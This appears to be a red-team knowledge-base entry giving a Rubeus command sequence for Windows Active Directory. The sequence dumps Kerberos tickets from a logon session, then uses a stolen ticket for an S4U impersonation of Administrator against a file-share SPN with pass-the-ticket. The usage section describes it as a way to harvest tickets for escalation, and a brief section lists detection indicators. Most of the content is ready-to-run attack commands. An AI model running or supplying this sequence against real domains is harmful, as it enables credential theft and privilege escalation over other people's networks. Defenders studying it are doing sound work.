---
id: 236cf1a7-ed78-4af0-9822-529a1ae7f3a9
name: rubeus-ticket-dump-and-s4u
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:07.695532+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - rubeus
  - ticket
validated: true
---

# rubeus-ticket-dump-and-s4u

## Code

```powershell
# Dump ticket
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe triage
Rubeus.exe dump /luid:0x12d1f7

# Create a ticket
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
```

## Description

Sequence to dump existing tickets with Rubeus and use one for S4U impersonation ticket creation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| LUID | Logon session ID | 0x12d1f7 |
| TICKET | Base64 dumped ticket | doIFRjCCBUKgAwIBB...BTA== |
| IMPERSONATEUSER | User | Administrator |
| MSDSSP | SPN | cifs/srv.domain.local |

## Usage

Execute on domain-joined host to harvest and reuse tickets for escalation via delegation.

## Detection

- Multiple Rubeus invocations in process tree.
- Ticket exports in memory dumps.
- LSASS access patterns.

## Related

- [[procedures/kerberos-constrained-delegation-exploitation]]
- [[tools/Rubeus]]
